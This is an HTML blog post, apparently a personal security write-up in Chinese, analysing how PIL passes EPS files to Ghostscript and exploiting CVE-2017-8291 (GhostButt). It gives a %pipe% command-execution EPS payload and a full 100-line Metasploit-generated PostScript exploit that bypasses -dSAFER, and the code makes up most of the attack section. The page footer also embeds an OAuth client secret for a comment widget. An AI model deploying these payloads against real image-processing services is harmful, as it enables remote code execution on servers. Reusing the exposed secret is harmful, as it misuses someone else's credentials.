@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言基本是跟着nearg1e大神的文章走的，自己比较菜，只能膜膜大神了https://github.com/neargle/PIL-RCE-By-GhostButt 环境Ubuntu16.04，PIL1.1.7，ghostscript-9.19(version &amp;lt;= 9.21) 分析首先是一个简单的Demo 1234567from PIL import Imagedef get_img_si">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PIL利用ghostscript漏洞">
+<meta property="og:url" content="https://rainbow541.github.io/2018/05/16/PIL利用ghostscript漏洞/index.html">
+<meta property="og:site_name" content="Rainbow541&#39;s Blog">
+<meta property="og:description" content="前言基本是跟着nearg1e大神的文章走的，自己比较菜，只能膜膜大神了https://github.com/neargle/PIL-RCE-By-GhostButt 环境Ubuntu16.04，PIL1.1.7，ghostscript-9.19(version &amp;lt;= 9.21) 分析首先是一个简单的Demo 1234567from PIL import Imagedef get_img_si">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/8148644-7823fbb26c68ebcd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/8148644-5164de57ccad85f8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/8148644-f4c42dd9f534c6b2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2017-11-05T07:24:02.090Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PIL利用ghostscript漏洞">
+<meta name="twitter:description" content="前言基本是跟着nearg1e大神的文章走的，自己比较菜，只能膜膜大神了https://github.com/neargle/PIL-RCE-By-GhostButt 环境Ubuntu16.04，PIL1.1.7，ghostscript-9.19(version &amp;lt;= 9.21) 分析首先是一个简单的Demo 1234567from PIL import Imagedef get_img_si">
+<meta name="twitter:image" content="http://upload-images.jianshu.io/upload_images/8148644-7823fbb26c68ebcd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://rainbow541.github.io/2018/05/16/PIL利用ghostscript漏洞/"/>
+
+
+
+
+
+  <title>PIL利用ghostscript漏洞 | Rainbow541's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Rainbow541's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://rainbow541.github.io/2018/05/16/PIL利用ghostscript漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="rainbow541">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Rainbow541's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">PIL利用ghostscript漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-16T15:08:02+08:00">
+                2018-05-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>基本是跟着nearg1e大神的文章走的，自己比较菜，只能膜膜大神了<br><a href="https://github.com/neargle/PIL-RCE-By-GhostButt" target="_blank" rel="noopener">https://github.com/neargle/PIL-RCE-By-GhostButt</a></p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Ubuntu16.04，PIL1.1.7，ghostscript-9.19(version &lt;= 9.21)</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先是一个简单的Demo</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">def get_img_size(filepath=&quot;&quot;):</span><br><span class="line">    if filepath:</span><br><span class="line">        img = Image.open(filepath)</span><br><span class="line">        img.load()</span><br><span class="line">        return img.size</span><br><span class="line">    return (0,0)</span><br></pre></td></tr></table></figure>
+<p>这个非常简单，就是获取图片size的Demo，这里调用了PIL里Image的Image.open和Image.load函数，加载图片<br>进下源码，看open函数里，由于这里我已经了解这个漏洞大概了，我直接看open函数对格式的判断吧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">for i in ID:</span><br><span class="line">        try:</span><br><span class="line">            factory, accept = OPEN[i]</span><br><span class="line">            if not accept or accept(prefix):</span><br><span class="line">                fp.seek(0)</span><br><span class="line">                return factory(fp, filename)</span><br><span class="line">        except (SyntaxError, IndexError, TypeError):</span><br><span class="line">            pass</span><br></pre></td></tr></table></figure>
+<p>看到accept(prefix),这个prefix是前缀，文件头，也就是说这里应用了文件头，我们再跟下这个accept</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#EpsImagePlugin</span><br><span class="line">def _accept(prefix):</span><br><span class="line">    return prefix[:4] == &quot;%!PS&quot; or i32(prefix) == 0xC6D3D0C5L</span><br><span class="line">#GifImagePlugin</span><br><span class="line">def _accept(prefix):</span><br><span class="line">    return prefix[:6] in [&quot;GIF87a&quot;, &quot;GIF89a&quot;]</span><br><span class="line">#CurImagePlugin</span><br><span class="line">def _accept(prefix):</span><br><span class="line">    return prefix[:4] == &quot;\0\0\2\0&quot;</span><br></pre></td></tr></table></figure>
+<p>这样的还有很多，也就是说，我们使用的后缀不要紧，重要的是文件头表示这是什么文件，我们试一下：<br>首先找一张普通图吧，这张图片是png格式，我改成jpg，然后用脚本走下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">def show(filename):</span><br><span class="line">    i=Image.open(filename)</span><br><span class="line">    print i.format</span><br><span class="line">show(&quot;./123.jpg&quot;)</span><br></pre></td></tr></table></figure>
+<p><img src="http://upload-images.jianshu.io/upload_images/8148644-7823fbb26c68ebcd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="[ 改后缀]
+"></p>
+<p>那么我改改文件头呢？<br><img src="http://upload-images.jianshu.io/upload_images/8148644-5164de57ccad85f8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>是可以的，做到让PIL懵逼<br>我跟着nearg1e大神的思路走了下就是阅读<code>EpsImagePlugin</code>的源码<br>load之后，我们走向EpsImagePlugin</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">command = [&quot;gs&quot;,</span><br><span class="line">               &quot;-q&quot;,                    # quite mode</span><br><span class="line">               &quot;-g%dx%d&quot; % size,        # set output geometry (pixels)</span><br><span class="line">               &quot;-dNOPAUSE -dSAFER&quot;,     # don&apos;t pause between pages, safe mode</span><br><span class="line">               &quot;-sDEVICE=ppmraw&quot;,       # ppm driver</span><br><span class="line">               &quot;-sOutputFile=%s&quot; % file,# output file</span><br><span class="line">               &quot;- &gt;/dev/null 2&gt;/dev/null&quot;]</span><br></pre></td></tr></table></figure>
+<p>命令是<code>gs -q -g%dx%d -dNOPAUSE -dSAFER -sDEVICE=ppmraw -sOutputFile=%s - &gt;/dev/null 2&gt;/dev/null</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">        gs = os.popen(command, &quot;w&quot;)</span><br><span class="line">        # adjust for image origin</span><br><span class="line">        if bbox[0] != 0 or bbox[1] != 0:</span><br><span class="line">            gs.write(&quot;%d %d translate\n&quot; % (-bbox[0], -bbox[1]))</span><br><span class="line">        fp.seek(offset)</span><br><span class="line">        while length &gt; 0:</span><br><span class="line">            s = fp.read(8192)</span><br><span class="line">            if not s:</span><br><span class="line">                break</span><br><span class="line">            length = length - len(s)</span><br><span class="line">            gs.write(s)</span><br><span class="line">        status = gs.close()</span><br><span class="line">        if status:</span><br><span class="line">            raise IOError(&quot;gs failed (status %d)&quot; % status)</span><br><span class="line">        im = Image.core.open_ppm(file)</span><br><span class="line">    finally:</span><br><span class="line">        try: os.unlink(file)</span><br><span class="line">        except: pass</span><br></pre></td></tr></table></figure></p>
+<p>这里就是dSAFER参数，这个参数限制了我们对文件删除、重命名以及命令执行的行为，但是牛逼的 <code>GhostButt CVE-2017-8291</code> 刚好就是 dSAFER 参数的 bypass。但是，这个漏洞，我一个web狗表示很纠结，于是，我先进行下不带dSAFER的尝试</p>
+<h1 id="不带dSAFER的尝试"><a href="#不带dSAFER的尝试" class="headerlink" title="不带dSAFER的尝试"></a>不带dSAFER的尝试</h1><p>我们直接把源码里的dSAFER注释掉，然后就可以了<br>不带dSAFER的使用，发现一切比较舒畅，我们直接利用gs的pipe通道就可以直接命令执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%!PS-Adobe-3.0 EPSF-3.0</span><br><span class="line">%%BoundingBox: -0 -0 100 100</span><br><span class="line"></span><br><span class="line">currentdevice null false mark /OutputFile (%pipe%echo &quot;hahaha&quot; &gt; /home/web/2333)&quot;)</span><br><span class="line">.putdeviceparams</span><br><span class="line">1 true .outputpage</span><br><span class="line">0 0 .quit</span><br></pre></td></tr></table></figure></p>
+<p>我们使用这个包装过的poc，我们可以改为png后缀，进行image.load操作，发现没毛病。之后就直接进行cve吧</p>
+<h1 id="GhostButt-CVE-2017-8291"><a href="#GhostButt-CVE-2017-8291" class="headerlink" title="GhostButt CVE-2017-8291"></a>GhostButt CVE-2017-8291</h1><p>这让我一个web狗很纠结啊，表示二进制很渣啊。<br>所以，我就直接用msf吧，生成了如下poc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">%!PS-Adobe-3.0 EPSF-3.0</span><br><span class="line">%%BoundingBox: -0 -0 100 100</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/size_from  10000      def</span><br><span class="line">/size_step    500      def</span><br><span class="line">/size_to   65000      def</span><br><span class="line">/enlarge    1000      def</span><br><span class="line"></span><br><span class="line">%/bigarr 65000 array def</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line">size_from size_step size_to &#123;</span><br><span class="line">    pop</span><br><span class="line">    1 add</span><br><span class="line">&#125; for</span><br><span class="line"></span><br><span class="line">/buffercount exch def</span><br><span class="line"></span><br><span class="line">/buffersizes buffercount array def</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0</span><br><span class="line">size_from size_step size_to &#123;</span><br><span class="line">    buffersizes exch 2 index exch put</span><br><span class="line">    1 add</span><br><span class="line">&#125; for</span><br><span class="line">pop</span><br><span class="line"></span><br><span class="line">/buffers buffercount array def</span><br><span class="line"></span><br><span class="line">0 1 buffercount 1 sub &#123;</span><br><span class="line">    /ind exch def</span><br><span class="line">    buffersizes ind get /cursize exch def</span><br><span class="line">    cursize string /curbuf exch def</span><br><span class="line">    buffers ind curbuf put</span><br><span class="line">    cursize 16 sub 1 cursize 1 sub &#123;</span><br><span class="line">        curbuf exch 255 put</span><br><span class="line">    &#125; for</span><br><span class="line">&#125; for</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/buffersearchvars [0 0 0 0 0] def</span><br><span class="line">/sdevice [0] def</span><br><span class="line"></span><br><span class="line">enlarge array aload</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    .eqproc</span><br><span class="line">    buffersearchvars 0 buffersearchvars 0 get 1 add put</span><br><span class="line">    buffersearchvars 1 0 put</span><br><span class="line">    buffersearchvars 2 0 put</span><br><span class="line">    buffercount &#123;</span><br><span class="line">        buffers buffersearchvars 1 get get</span><br><span class="line">        buffersizes buffersearchvars 1 get get</span><br><span class="line">        16 sub get</span><br><span class="line">        254 le &#123;</span><br><span class="line">            buffersearchvars 2 1 put</span><br><span class="line">            buffersearchvars 3 buffers buffersearchvars 1 get get put</span><br><span class="line">            buffersearchvars 4 buffersizes buffersearchvars 1 get get 16 sub put</span><br><span class="line">        &#125; if</span><br><span class="line">        buffersearchvars 1 buffersearchvars 1 get 1 add put</span><br><span class="line">    &#125; repeat</span><br><span class="line"></span><br><span class="line">    buffersearchvars 2 get 1 ge &#123;</span><br><span class="line">        exit</span><br><span class="line">    &#125; if</span><br><span class="line">    %(.) print</span><br><span class="line">&#125; loop</span><br><span class="line"></span><br><span class="line">.eqproc</span><br><span class="line">.eqproc</span><br><span class="line">.eqproc</span><br><span class="line">sdevice 0</span><br><span class="line">currentdevice</span><br><span class="line">buffersearchvars 3 get buffersearchvars 4 get 16#7e put</span><br><span class="line">buffersearchvars 3 get buffersearchvars 4 get 1 add 16#12 put</span><br><span class="line">buffersearchvars 3 get buffersearchvars 4 get 5 add 16#ff put</span><br><span class="line">put</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffersearchvars 0 get array aload</span><br><span class="line"></span><br><span class="line">sdevice 0 get</span><br><span class="line">16#3e8 0 put</span><br><span class="line"></span><br><span class="line">sdevice 0 get</span><br><span class="line">16#3b0 0 put</span><br><span class="line"></span><br><span class="line">sdevice 0 get</span><br><span class="line">16#3f0 0 put</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">currentdevice null false mark /OutputFile (%pipe%echo &quot;**&quot; &gt; /root/flag)</span><br><span class="line">.putdeviceparams</span><br><span class="line">1 true .outputpage</span><br><span class="line">.rsdparams</span><br><span class="line">%&#123; &#125; loop</span><br><span class="line">0 0 .quit</span><br><span class="line">%asdf</span><br></pre></td></tr></table></figure></p>
+<p>但是很纠结的是不行啊。<br>于是我又在9.21版本试了一次，结果发现，可以了。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/8148644-f4c42dd9f534c6b2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>也就是说这个cve只适用于9.21版本的，所以兄弟们注意了。</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>由于自己不是pwn大神，所以这个cve就先放一下吧，以后功力涨了再说，先把web端搞好。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>感谢老爷打赏</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="https://upload-images.jianshu.io/upload_images/8148644-0fbf2b9b5972b6ed.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="rainbow541 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/05/16/Discuz 3.4漏洞/" rel="next" title="Discuz 3.4漏洞">
+                <i class="fa fa-chevron-left"></i> Discuz 3.4漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/05/16/XDCTF中脑洞的upload题/" rel="prev" title="XDCTF中脑洞的upload题">
+                XDCTF中脑洞的upload题 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+  <div onclick="showGitment()" id="gitment_title" class="gitment_title">显示 Gitment 评论</div>
+  <div id="container" style="display:none"></div>
+  <link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+  <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+  <script>
+  const myTheme = {
+    render(state, instance) {
+      const container = document.createElement('div');
+      container.lang = "en-US";
+      container.className = 'gitment-container gitment-root-container';
+      container.appendChild(instance.renderHeader(state, instance));
+      container.appendChild(instance.renderEditor(state, instance));
+      container.appendChild(instance.renderComments(state, instance));
+      container.appendChild(instance.renderFooter(state, instance));
+      return container;
+    }
+  }
+  function showGitment() {
+    $("#gitment_title").attr("style", "display:none");
+    $("#container").attr("style", "").addClass("gitment_container");
+    var gitment = new Gitment({
+      id: window.location.pathname,
+      theme: myTheme,
+      owner: 'rainbow541',
+      repo: 'rainbow541.github.io',
+      oauth: {
+        client_id: 'ed36115102b8c7e52f62',
+        client_secret: '77ab6a9abf0c36021f818b3ab4112447b8d99aab'
+      }
+    });
+    gitment.render('container');
+  }
+  </script>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">rainbow541</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/rainbow541" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.zhihu.com/people/wang-da-bai-50-39/activities" target="_blank" title="Zhihu">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Zhihu</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境"><span class="nav-number">2.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析"><span class="nav-number">3.</span> <span class="nav-text">分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#不带dSAFER的尝试"><span class="nav-number"></span> <span class="nav-text">不带dSAFER的尝试</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GhostButt-CVE-2017-8291"><span class="nav-number"></span> <span class="nav-text">GhostButt CVE-2017-8291</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#后记"><span class="nav-number">1.</span> <span class="nav-text">后记</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rainbow541</span>
+
+  
+</div>
+
+
+ <!--  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>-->
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+<!-- LOCAL: You can save these files to your site and update links -->
+    
+        
